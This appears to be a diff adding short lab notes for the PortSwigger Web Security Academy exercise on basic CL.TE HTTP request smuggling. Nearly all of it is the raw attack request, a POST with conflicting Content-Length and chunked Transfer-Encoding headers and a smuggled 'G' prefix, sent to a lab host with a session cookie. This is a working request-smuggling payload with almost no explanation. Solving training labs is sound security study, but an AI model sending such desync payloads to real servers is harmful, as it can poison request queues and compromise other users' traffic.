@@ -1,0 +1,26 @@
+HTTP request smuggling, basic CL.TE vulnerability
+Doesnot require to uncheck "Update Content-Lenght"
+
+
+POST / HTTP/1.1
+Host: 0ad800f20348af67c15c2e2d00f30082.web-security-academy.net
+Cookie: session=N5alg9MHySi6OY91rWqhEfVmb7h5VIcf
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://0ad800f20348af67c15c2e2d00f30082.web-security-academy.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G 
